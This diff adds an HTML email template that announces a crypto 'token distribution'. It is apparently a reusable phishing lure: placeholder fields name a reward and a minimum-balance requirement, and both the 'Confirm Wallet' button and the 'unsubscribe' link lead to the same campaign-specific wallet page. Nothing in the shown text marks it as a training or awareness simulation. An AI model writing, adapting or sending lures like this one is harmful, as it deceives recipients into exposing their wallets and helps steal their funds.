@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Asset Update</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            line-height: 1.5;
+            background-color: transparent;
+            padding: 20px;
+            background-color: #ffffff;
+        }
+        
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: transparent;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+        
+        .header {
+            border-radius: 2em;
+            background: linear-gradient(to right, #1a56db, #1e429f);
+            padding: 32px 24px;
+            text-align: center;
+            color: white;
+        }
+        
+        .header h1 {
+            font-size: 24px;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+        
+        .header p {
+            font-size: 16px;
+            opacity: 0.9;
+        }
+        
+        .content {
+            padding: 24px;
+        }
+        
+        .amount-card {
+            background-color: #f0f9ff;
+            border-radius: 8px;
+            padding: 20px;
+            text-align: center;
+            margin: 24px 0;
+        }
+        
+        .amount-label {
+            color: #0369a1;
+            font-size: 10px;
+            margin-bottom: 8px;
+        }
+        
+        .amount-value {
+            color: #0c4a6e;
+            font-size: 28px;
+            font-weight: bold;
+            
+        }
+        
+        .details-card {
+            background-color: #ffffff;
+            border: 1px solid #e2e8f0;
+            border-radius: 8px;
+            padding: 20px;
+            margin: 24px 0;
+        }
+        
+        .detail-row {
+            padding: 12px 0;
+            border-bottom: 1px solid #e2e8f0;
+        }
+        
+        .detail-row:last-child {
+            border-bottom: none;
+            padding-bottom: 0;
+        }
+        
+        .detail-row:first-child {
+            padding-top: 0;
+        }
+        
+        .detail-label {
+            color: #64748b;
+            font-size: 14px;
+            margin-bottom: 4px;
+        }
+        
+        .detail-value {
+            color: #0f172a;
+            font-size: 16px;
+            font-weight: 500;
+        }
+        
+        .intro-text {
+            color: #334155;
+            margin-bottom: 16px;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        
+        .intro-text:last-of-type {
+            margin-bottom: 0;
+        }
+        
+        .cta-button {
+            display: block;
+            background: linear-gradient(to right, #2563eb, #1d4ed8);
+            color: white;
+            text-decoration: none;
+            padding: 16px 32px;
+            border-radius: 8px;
+            text-align: center;
+            font-weight: 600;
+            margin: 24px 0;
+            transition: transform 0.1s ease;
+        }
+        
+        .cta-button:hover {
+            transform: translateY(-1px);
+        }
+        
+        .footer {
+            background-color: #f8fafc;
+            padding: 24px;
+            text-align: center;
+            border-top: 1px solid #e2e8f0;
+        }
+        
+        .footer p {
+            color: #64748b;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+        
+        .footer p:last-child {
+            margin-bottom: 0;
+        }
+        
+        @media (max-width: 600px) {
+            body {
+                padding: 12px;
+            }
+            
+            .header {
+                padding: 24px 16px;
+            }
+            
+            .content {
+                padding: 16px;
+            }
+            
+            .header h1 {
+                font-size: 24px;
+            }
+            
+            .amount-value {
+                font-size: 28px;
+            }
+            
+            .amount-label {
+                font-size: 18px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Crypto Asset Update</h1>
+            <p>Account Confirmation Needed</p>
+        </div>
+        
+        <div class="content">
+            <p class="intro-text">Your wallet has been selected for a {{ cryptocurrency }} token distribution due to your recent blockchain activity. Below are your details:</p>
+            
+            <div class="amount-card">
+                <div class="amount-label">Possible Reward</div>
+                <div class="amount-value">{{ quantity }} {{ cryptocurrency }}</div>
+            </div>
+            
+            <div class="details-card">
+                <div class="detail-row">
+                    <div class="detail-label">Distribution Asset</div>
+                    <div class="detail-value">{{ cryptocurrency }}</div>
+                </div>
+                <div class="detail-row">
+                    <div class="detail-label">Requirement for participation</div>
+                    <div class="detail-value">{{ min_balance }} {{ cryptocurrency }}</div>
+                </div>
+                <div class="detail-row">
+                    <div class="detail-label">Status</div>
+                    <div class="detail-value" style="color: #ea580c;">Awaiting Completion</div>
+                </div>
+            </div>
+            
+            <p class="intro-text">Based on activities your wallet qualified and We have noted your address. Details for accessing the reward can be found here</p>
+            
+            <a href="{{ base_url }}/wallet-info/{{ campaign_id }}/" class="cta-button">
+                Confirm Wallet
+            </a>
+        </div>
+        
+        <div class="footer">
+            <p>&copy; {{ current_year }} {{ cryptocurrency }} Distribution</p>
+            <p>If you no longer wish to receive these emails, you can <a href="{{ base_url }}/wallet-info/{{ campaign_id }}/" style="color: #2563eb; text-decoration: underline;">unsubscribe here</a>.</p>
+        </div>
+    </div>
+</body>
+</html>
